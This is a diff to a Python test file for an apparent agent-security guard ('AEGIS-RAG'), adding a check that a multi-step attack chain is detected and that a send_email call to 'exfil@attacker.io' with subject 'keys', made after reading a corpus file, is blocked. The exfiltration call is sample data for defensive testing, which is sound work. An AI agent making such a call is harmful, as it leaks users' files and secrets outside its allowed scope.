@@ -67,6 +67,27 @@ def test_dual_simulation():
     assert unprot.status == "EXPLOITED"
     assert prot.status == "BLOCKED"
 
+def test_multi_chain_detection():
+    # 1. End-to-end multi-step scenario simulation check
+    multistep_scenario = next(s for s in SCENARIOS if s.category == AttackCategory.MULTI_STEP)
+    unprot, prot = simulate_execution(multistep_scenario)
+    assert prot.guard_result is not None
+    assert prot.guard_result.is_multi_chain is True
+    assert len(prot.guard_result.chain_lineage) >= 3
+
+    # 2. Stateful Action Guard call-graph taint tracking check
+    from shield.guard.guard import evaluate_tool_call
+    from shield.models import Scope, ToolCall
+    from shield.sandbox import Sandbox
+    scope = Scope(allowed_tools=["read_file", "send_email"], allowed_paths=["data/corpus/"], allowed_recipients=["team@company.internal"])
+    sb = Sandbox()
+    history = [{"tool": "read_file", "args": {"path": "data/corpus/vendor.pdf"}, "status": "executed"}]
+    egress_call = ToolCall(tool="send_email", args={"to": "exfil@attacker.io", "subject": "keys", "body": "leak"})
+    dec = evaluate_tool_call(egress_call, scope, sb, history=history)
+    assert dec.verdict == "BLOCK"
+    assert dec.is_multi_chain is True
+    assert len(dec.chain_lineage) >= 3
+
 if __name__ == "__main__":
     print("[RUNNING] Running AEGIS-RAG security self-checks...")
     test_decoding_engine()
@@ -77,4 +98,6 @@ if __name__ == "__main__":
     print("  [OK] Action Guard self-check passed.")
     test_dual_simulation()
     print("  [OK] Dual agent simulation self-check passed.")
-    print("All 4 self-checks PASSED successfully!")
+    test_multi_chain_detection()
+    print("  [OK] Multi-chain taint lineage self-check passed.")
+    print("All 5 self-checks PASSED successfully!")
